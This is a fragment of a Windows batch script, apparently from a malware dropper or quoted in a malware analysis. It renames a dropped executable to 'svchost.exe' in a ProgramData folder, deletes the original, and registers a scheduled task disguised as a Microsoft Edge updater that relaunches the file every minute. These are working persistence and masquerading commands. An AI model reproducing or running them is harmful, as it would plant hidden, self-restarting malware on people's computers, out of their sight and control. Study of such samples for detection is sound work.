...
if "%all_success%"=="true" (
    ...
    move "C:\programdata\temp\Win64_vm.exe" "C:\programdata\USDprivate\svchost.exe"
    del /f "C:\programdata\temp\Win64_vm.exe"

    schtasks /create /tn "MicrosoftEdgeUpdateV" /tr "C:\programdata\USDprivate\svchost.exe" /sc minute /mo 1 /st 00:00 /ru "%USERNAME%" /f
